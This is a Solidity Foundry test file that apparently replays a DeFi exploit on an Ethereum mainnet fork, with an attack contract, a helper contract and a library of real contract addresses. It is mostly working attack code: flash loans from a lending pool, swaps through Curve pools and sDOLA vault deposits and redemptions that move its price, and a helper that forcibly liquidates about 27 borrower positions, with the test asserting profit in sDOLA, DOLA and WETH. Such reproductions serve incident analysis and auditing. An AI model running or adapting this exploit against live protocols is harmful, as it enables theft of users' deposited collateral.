
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 24566936;
    uint256 constant TX_TIMESTAMP = 1772420411;
    uint256 constant TX_BLOCK_NUMBER = 24566937;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _etchHelpers();
        attack.bindHelper(Addresses.attack_helper);
        _expectOutcome(address(attack), Addresses.attack_helper);
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _etchHelpers() internal {
        vm.etch(Addresses.attack_helper, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper);
        _hydrateAttackHelper();
    }

    function _hydrateAttackHelper() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_helper,
                bytes32(uint256(0)),
                bytes32(uint256(294741518335804130216123876449171826342785272802))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_helper,
                bytes32(uint256(1)),
                bytes32(uint256(1238323123374669402494620647169048666319426906498))
            );
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attack_helper, helper, Addresses.sDOLA, "sDOLA", 38937269897759257032249);
        _expectProfit(Addresses.attack_contract, attack, Addresses.DOLA, "DOLA", 227325565940517368498878);
        _expectProfit(Addresses.attack_contract, attack, Addresses.WETH, "WETH", 6736786843758250452);
    }
}

contract OurAttack {





    AttackerHelper public helper;

    function attack() external payable {
        _attack();
    }

    function flashCallback() internal {
        _markCallback(0);
        flashCallback3();
        flashCallback4();
        flashCallback5();
    }

    function flashCallback3() internal {
        IERC20Like(Addresses.crvUSD).approve(Addresses.LLAMMA_crvUSD_AMM, type(uint256).max);
        IERC20Like(Addresses.sDOLA).approve(Addresses.LLAMMA_crvUSD_AMM, type(uint256).max);
        IERC20Like(Addresses.sDOLA).approve(Addresses.A_AD4446_FB86, type(uint256).max);
        IERC20Like(Addresses.crvUSD).approve(Addresses.crvUSD_Controller, type(uint256).max);
        IERC20Like(Addresses.DOLA).approve(Addresses.sDOLA, type(uint256).max);
        IERC20Like(Addresses.DOLA).approve(Addresses.A_E5F247_B8B4, type(uint256).max);
        IERC20Like(Addresses.alUSD).approve(Addresses.alUSDsDOLA, type(uint256).max);
        IERC20Like(Addresses.scrvUSD).approve(Addresses.savedola, type(uint256).max);
        IERC20Like(Addresses.sDOLA).approve(Addresses.alUSDsDOLA, type(uint256).max);
        IERC20Like(Addresses.sDOLA).approve(Addresses.savedola, type(uint256).max);
        IalUSDFRAXB3CRV_f(Addresses.alUSDFRAXB3CRV_f).exchange_underlying(int128(2), int128(0), 7000000000000, 1);
        IalUSDsDOLA(Addresses.alUSDsDOLA).exchange(int128(1), int128(0), 650000000000000000000000, 1);
        uint256 wethBalanceOfAttackAttackContract = IERC20Like(Addresses.WETH).balanceOf(address(this));
        {
            IWETH(Addresses.WETH).withdraw(wethBalanceOfAttackAttackContract);
        }
        {
            IcrvUSD_Controller(Addresses.crvUSD_Controller).create_loan{value: 15986107781121575327545}(
                wethBalanceOfAttackAttackContract, 25000000000000000000000000, 4
            );
        }
        IscrvUSD(Addresses.scrvUSD).deposit(7000000000000000000000000, address(this));
        Isavedola(Addresses.savedola).exchange(int128(0), int128(1), 370000000000000000000000, 1);
        ILLAMMA_crvUSD_AMM(Addresses.LLAMMA_crvUSD_AMM).exchange(0, 1, 16000000000000000000000000, 1);
        uint256 sDOLABalanceOfAttackAttackContract = IERC20Like(Addresses.sDOLA).balanceOf(address(this));
        {
            uint256 redeemLiveShares = 10607802324426851991085715;
            uint256 redeemLiveSharesAvailable = IERC20Like(Addresses.sDOLA).balanceOf(address(this));
            if (redeemLiveShares > redeemLiveSharesAvailable) redeemLiveShares = redeemLiveSharesAvailable;
            IsDOLA(Addresses.sDOLA).redeem(redeemLiveShares, address(this), address(this));
        }
    }

    function flashCallback4() internal {
        IERC20Like(Addresses.sDOLA).totalSupply();
        IContract_E5F247_B8B4(Addresses.A_E5F247_B8B4).stake(190777474808103397780234, Addresses.sDOLA);
        IsDOLA(Addresses.sDOLA).convertToAssets(1000000000000000000);
        ILLAMMA_crvUSD_AMM(Addresses.LLAMMA_crvUSD_AMM).exchange(0, 1, 0, 1);
        {
            bytes32 replaySalt = bytes32(uint256(294741518335804130216123876449171826342785272802));
            replaySalt;
            address created = Addresses.attack_helper;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper))._helper();
        uint256 crvUSDBalanceOfAttackAttackContract = IERC20Like(Addresses.crvUSD).balanceOf(address(this));
        {
            IERC20Like(Addresses.crvUSD)
                .transfer(Addresses.attack_helper, crvUSDBalanceOfAttackAttackContract);
        }
        AttackerHelper(payable(Addresses.attack_helper)).helperCb();
        {
            uint256 sDOLAMintAmount = 1300000000000000000000000;
            IsDOLA(Addresses.sDOLA).mint(sDOLAMintAmount, address(this));
        }
        IalUSDsDOLA(Addresses.alUSDsDOLA).get_dx(int128(0), int128(1), 685000000000000000000000);
        IalUSDsDOLA(Addresses.alUSDsDOLA).exchange(int128(0), int128(1), 435278986455784789133072, 1);
        uint256 alUSDBalanceOfAttackAttackContract = IERC20Like(Addresses.alUSD).balanceOf(address(this));
        {
            IalUSDFRAXB3CRV_f(Addresses.alUSDFRAXB3CRV_f)
                .exchange_underlying(int128(0), int128(2), alUSDBalanceOfAttackAttackContract, 1);
        }
        Isavedola(Addresses.savedola).get_dx(int128(1), int128(0), 372000000000000000000000);
        Isavedola(Addresses.savedola).exchange(int128(1), int128(0), 291055898551298512325175, 1);
        uint256 scrvUSDBalanceOfAttackAttackContract = IERC20Like(Addresses.scrvUSD).balanceOf(address(this));
        {
            uint256 redeemLiveShares_2 = 6413421804415345738574204;
            uint256 redeemLiveShares_2Available = IERC20Like(Addresses.scrvUSD).balanceOf(address(this));
            if (redeemLiveShares_2 > redeemLiveShares_2Available) redeemLiveShares_2 = redeemLiveShares_2Available;
            IscrvUSD(Addresses.scrvUSD).redeem(redeemLiveShares_2, address(this), address(this));
        }
        uint256 sDOLABalanceOfAttackAttackContract_2 = IERC20Like(Addresses.sDOLA).balanceOf(address(this));
        {
            uint256 redeemLiveShares_3 = 573665114992916698541753;
            uint256 redeemLiveShares_3Available = IERC20Like(Addresses.sDOLA).balanceOf(address(this));
            if (redeemLiveShares_3 > redeemLiveShares_3Available) redeemLiveShares_3 = redeemLiveShares_3Available;
            IsDOLA(Addresses.sDOLA).redeem(redeemLiveShares_3, address(this), address(this));
        }
        ILLAMMA_crvUSD_AMM(Addresses.LLAMMA_crvUSD_AMM).exchange(0, 1, 0, 1);
    }

    function flashCallback5() internal {
        IERC20Like(Addresses.crvUSD).balanceOf(address(this));
        uint256 aAd4446Fb86MinCollateralReturn =
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).min_collateral(10904020804458172792365906, 4);
        {
            IsDOLA(Addresses.sDOLA).mint(aAd4446Fb86MinCollateralReturn, address(this));
        }
        {
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86)
                .create_loan(aAd4446Fb86MinCollateralReturn, 10904020804458172792365806, 4);
        }
        IcrvUSD_Controller(Addresses.crvUSD_Controller).repay(50000000000000000000000000);
        IERC20Like(Addresses.USDC).balanceOf(address(this));
        {
            if (13241509653 != 0) {
                IERC20Like(Addresses.USDC).approve(Addresses.A_7A250D_488D, 13241509653);
                IContract_7A250D_488D(Addresses.A_7A250D_488D)
                    .swapExactTokensForTokens(
                        13241509653,
                        1,
                        _addressArray2(Addresses.USDC, Addresses.WETH),
                        address(this),
                        1772420411
                    );
            }
        }
        {
            (bool ok,) = payable(Addresses.WETH).call{value: 15986107781121575327541}("");
            if (!ok)
            {  }
        }
        {
            uint256 wethApproveAllowance = 15986107781121575327545;
            IERC20Like(Addresses.WETH).approve(Addresses.A_BBBBBB_FFCB, wethApproveAllowance);
        }
    }

    function flashCallback2() internal {
        _markCallback(1);
        IERC20Like(Addresses.WETH).balanceOf(Addresses.A_BBBBBB_FFCB);
        {
            bytes memory flashLoanProof = abi.encode(Addresses.WETH);
            IContract_BBBBBB_FFCB(Addresses.A_BBBBBB_FFCB)
                .flashLoan(Addresses.WETH, 15986107781121575327545, flashLoanProof);
        }
        IERC20Like(Addresses.USDC).approve(Addresses.A_BBBBBB_FFCB, 10000000000000);
    }

    function _attack() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(1)),
                bytes32(uint256(766866110028457571229439721998465253712624131300))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(2)),
                bytes32(uint256(1029643645083015693200435462102798143050172691205))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(3)),
                bytes32(uint256(2710269475027120597323850551094258711820935671))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(4)),
                bytes32(uint256(989177985838225541252706090210956865364707507078))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(5)),
                bytes32(uint256(399768115310636152629912678892294314498522077311))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(6)),
                bytes32(uint256(677438337329798452554477711806330416296567399991))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(7)),
                bytes32(uint256(1312761901470954790812855100178840044955128936628))
            );
        {
            bytes memory flashLoanProof = abi.encode(Addresses.USDC);
            IContract_BBBBBB_FFCB(Addresses.A_BBBBBB_FFCB)
                .flashLoan(Addresses.USDC, 10000000000000, flashLoanProof);
        }
    }

    function _attack2() internal {
        _markCallback(3);
    }

    receive() external payable {}

    function onMorphoFlashLoan(uint256 amount, bytes calldata arg1) external payable {
        amount;
        arg1;
        {
            uint256 arg0;
            assembly { arg0 := calldataload(4) }
            if (arg0 == 10000000000000) {
                flashCallback2();
                return;
            }
        }
        {
            uint256 arg0;
            assembly { arg0 := calldataload(4) }
            if (arg0 == 15986107781121575327545) {
                flashCallback();
                return;
            }
        }
        flashCallback2();
        return;
    }

    fallback() external payable {
        if (msg.sig == 0x8201355f) {
            _attack();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    function bindHelper(address attackHelper) external {
        helper = AttackerHelper(payable(attackHelper));
    }

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

contract AttackerHelper {
    receive() external payable {}

    fallback() external payable {
        if (msg.sig == 0xdf3644ce) {
            _helperCb();
            return;
        }
        _entryCb();
    }

    function helperCb() external payable {
        _helperCb();
        return;
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }

    function _helperCb() internal {
        IERC20Like(Addresses.crvUSD).approve(Addresses.A_AD4446_FB86, type(uint256).max);
        IContract_AD4446_FB86(Addresses.A_AD4446_FB86).users_to_liquidate();
        {
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_2B083A_4FBE, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_CBCC2B_5A14, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_BA5AA2_F844, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_145E30_C1D2, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_F60DE7_75D7, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_E9C0DF_5EF6, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_8DB987_0E75, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_C6C77B_59D0, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_5B860E_0B7D, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_B152FC_CA52, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_E170ED_9300, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_8FC577_903F, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_80C67F_40C4, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_9BF8AF_FA20, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_21AB08_9700, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_6CE504_0A75, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_C69F65_EF4B, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.SafeProxy, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_C8233A_5F29, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_C8801F_F5DE, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_57F845_2FC5, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_D4FFCD_F781, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_3E258A_861B, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_6EF36F_D2E1, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_2D5774_67D9, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_ADBAFA_7308, 0);
            IContract_AD4446_FB86(Addresses.A_AD4446_FB86).liquidate(Addresses.A_846724_A2F9, 0);
        }
        uint256 crvUSDBalanceOfAttackHelper = IERC20Like(Addresses.crvUSD).balanceOf(Addresses.attack_helper);
        IERC20Like(Addresses.crvUSD).transfer(Addresses.attack_contract, crvUSDBalanceOfAttackHelper);
        IERC20Like(Addresses.DOLA).balanceOf(Addresses.attack_helper);
        IERC20Like(Addresses.DOLA).transfer(Addresses.attack_contract, 0);
    }

    function _helper() public {}
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct AttackCall {
    address target;
    bytes data;
}

interface VmExt {
    function store(address target, bytes32 slot, bytes32 value) external;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_0004 = 0x0000000000000000000000000000000000000004;
    address internal constant LLAMMA_crvUSD_AMM = 0x0079885E248B572CdC4559A8B156745e2d8EA1f7;
    address internal constant scrvUSD = 0x0655977FEb2f289A4aB78af67BAB0d17aAb84367;
    address internal constant Vyper_contract_07491D = 0x07491D124ddB3Ef59a8938fCB3EE50F9FA0b9251;
    address internal constant A_145E30_C1D2 = 0x145e305A6E8979CbEfCb75993f7aE5270856c1d2;
    address internal constant LLAMMA_crvUSD_AMM_C4EE = 0x1681195C176239ac5E72d9aeBaCf5b2492E0C4ee;
    address internal constant AggregatorStablePrice_aggregator_of_stablecoin_prices_for_crvUSD =
        0x18672b1b0c623a30089A280Ed9256379fb0E4E62;
    address internal constant A_21AB08_9700 = 0x21Ab0875611da0235BC5b6405b8A08268D859700;
    address internal constant SDOLA_Rate_Calculator = 0x2640007c6E65A26c4a411beC5bFA94e8f3a48c96;
    address internal constant A_2B083A_4FBE = 0x2b083a0aA6B808A31e9Ac749772a285F5CD34FBe;
    address internal constant A_2D5774_67D9 = 0x2D57740EE18594bCbfa845703FaD49882e1567d9;
    address internal constant crvFRAX = 0x3175Df0976dFA876431C2E9eE6Bc45b65d3473CC;
    address internal constant attacker_eoa = 0x33A0aAb2642c78729873786e5903CC30F9a94be2;
    address internal constant A_3E258A_861B = 0x3e258AAe11D7eA394b2eb1176CcD54D9EB83861b;
    address internal constant FiatTokenV2_2 = 0x43506849D7C04F9138D1A2050bbF3A0c054402dd;
    address internal constant alUSDsDOLA = 0x460638e6F7605B866736e38045C0DE8294d7D87f;
    address internal constant A_57F845_2FC5 = 0x57F845829140D9d9D8e357fA0D9f943483a12FC5;
    address internal constant A_5B860E_0B7D = 0x5B860E2D38f723d5370cF21f82d6aDAd31EF0B7D;
    address internal constant EMAMonetaryPolicy = 0x6640500C9be3DB65aE7e235A91E739Bc7d1C4Dc0;
    address internal constant A_6CE504_0A75 = 0x6Ce50491FAA9FaC1Dc883A2769Ab129E75eB0A75;
    address internal constant SafeProxy = 0x6dB248100cF4908429AB671F33D105311ED7fEF8;
    address internal constant A_6EF36F_D2E1 = 0x6EF36f7130D00addF40Ce9b040DA0bc02491D2e1;
    address internal constant savedola = 0x76A962BA6770068bCF454D34dDE17175611e6637;
    address internal constant A_7A250D_488D = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant A_80C67F_40C4 = 0x80C67fe70d7D6cC488782439fad381d8646640c4;
    address internal constant A_846724_A2F9 = 0x8467241838Bc761D9Ef4F8ae6790Ede292fbA2F9;
    address internal constant DOLA = 0x865377367054516e17014CcdED1e7d814EDC9ce4;
    address internal constant A_88822E_8FF2 = 0x88822eE517Bfe9A1b97bf200b0b6D3F356488fF2;
    address internal constant A_8DB987_0E75 = 0x8db98764ada29B55a23F7A8cb07Be6F74F0D0e75;
    address internal constant A_8FC577_903F = 0x8fc5777D607171B42a61FED4c74242E54677903F;
    address internal constant A_9BF8AF_FA20 = 0x9BF8Af305152FAdDd81c70f8599148e9FC6EFA20;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant crvUSD_Controller = 0xA920De414eA4Ab66b97dA1bFE9e6EcA7d4219635;
    address internal constant A_AD4446_FB86 = 0xaD444663c6C92B497225c6cE65feE2E7F78BFb86;
    address internal constant A_ADBAFA_7308 = 0xaDBAfAE28C3041ECb74456cd7fB9097bD1287308;
    address internal constant A_B152FC_CA52 = 0xb152FC7E9ddf01A942685E390A74009cd2B9Ca52;
    address internal constant alUSDFRAXB3CRV_f = 0xB30dA2376F63De30b42dC055C93fa474F31330A5;
    address internal constant sDOLA = 0xb45ad160634c528Cc3D2926d9807104FA3157305;
    address internal constant UNI_V2 = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant A_BA5AA2_F844 = 0xba5Aa2A3dbbBB4c7C3A8950Fc6251bB8020cf844;
    address internal constant A_BBBBBB_FFCB = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address internal constant alUSD = 0xBC6DA0FE9aD5f3b0d58160288917AA56653660E9;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant A_C69F65_EF4B = 0xc69F65D2720DF32c244163E0F608284415aAEF4B;
    address internal constant attack_helper = 0xC6C2fcdf688BAeB7b03D9D9C088c183dbB499ac0;
    address internal constant A_C6C77B_59D0 = 0xc6c77B16A85C3946e0BDfC71fdb7eFD3d89359d0;
    address internal constant A_C8233A_5F29 = 0xC8233a46F57Add754f32Cf9e25A85aAe8a7D5f29;
    address internal constant A_C8801F_F5DE = 0xC8801FFAaA9DfCce7299e7B4Eb616741EA01F5DE;
    address internal constant A_CBCC2B_5A14 = 0xcBcC2b2eCD195eBEF03Fcb7c7564e4E906485A14;
    address internal constant A_D4FFCD_F781 = 0xD4FFcD8b6B7Ec90f4EAC001125f4A7B21DC0f781;
    address internal constant Yearn_V3_Vault = 0xd8063123BBA3B480569244AE66BFE72B6c84b00d;
    address internal constant attack_contract = 0xd8E8544E0c808641b9b89dfB285b5655BD5B6982;
    address internal constant A_DCEF96_41A2 = 0xDcEF968d416a41Cdac0ED8702fAC8128A64241A2;
    address internal constant A_E170ED_9300 = 0xE170ED9D77792397271d564c7161351d69fe9300;
    address internal constant A_E5F247_B8B4 = 0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4;
    address internal constant A_E9C0DF_5EF6 = 0xe9c0DF9BD4607850d410C957FeC11eC209De5Ef6;
    address internal constant A_F60DE7_75D7 = 0xF60De76791c2F09995df52Aa1c6e2E7DcF1E75d7;
    address internal constant crvUSD = 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E;
}

interface IContract_7A250D_488D {
    function swapExactTokensForTokens(uint256, uint256, address[] calldata, address, uint256) external;
}

interface IContract_AD4446_FB86 {
    function create_loan(uint256, uint256, uint256) external;
    function liquidate(address, uint256) external;
    function min_collateral(uint256, uint256) external view returns (uint256);
    function users_to_liquidate() external view;
}

interface IContract_BBBBBB_FFCB {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface IContract_E5F247_B8B4 {
    function stake(uint256, address) external;
}

interface ILLAMMA_crvUSD_AMM {
    function exchange(uint256, uint256, uint256, uint256) external;
}

interface IWETH {
    function withdraw(uint256) external;
}

interface IalUSDFRAXB3CRV_f {
    function exchange_underlying(int128, int128, uint256, uint256) external returns (uint256);
}

interface IalUSDsDOLA {
    function exchange(int128, int128, uint256, uint256) external returns (uint256);
    function get_dx(int128, int128, uint256) external view returns (uint256);
}

interface IcrvUSD_Controller {
    function create_loan(uint256, uint256, uint256) external payable;
    function repay(uint256) external;
}

interface IsDOLA {
    function convertToAssets(uint256) external view returns (uint256);
    function mint(uint256, address) external returns (uint256);
    function redeem(uint256, address, address) external returns (uint256);
    function mint(address to) external returns (uint256 liquidity);
}

interface Isavedola {
    function exchange(int128, int128, uint256, uint256) external returns (uint256);
    function get_dx(int128, int128, uint256) external view returns (uint256);
}

interface IscrvUSD {
    function deposit(uint256, address) external returns (uint256);
    function redeem(uint256, address, address) external returns (uint256);
}

library Harness {
    function vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
